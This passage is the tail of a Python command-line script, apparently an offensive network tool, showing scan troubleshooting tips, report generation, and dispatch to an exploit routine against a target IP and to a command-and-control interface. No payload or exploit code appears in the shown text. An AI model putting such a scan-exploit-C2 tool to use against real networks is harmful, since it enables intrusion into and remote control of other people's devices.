            print_status("[!] Tips:", 'warning')
            print_status("   1. Make sure devices are on the same network", 'warning')
            print_status("   2. Check if devices are awake (not in sleep mode)", 'warning')
            print_status("   3. Try scanning a different network range", 'warning')
            sys.exit(1)
        
        # Generate report
        scanner.report()
        
        # Run exploits if requested
        if args.exploit:
            scanner.exploit(args.target_ip)
    
    # Start C2 interface
    if args.c2:
        scanner.start_c2()
    
    if not args.scan and not args.exploit and not args.c2:
        parser.print_help()

if __name__ == '__main__':
    main()
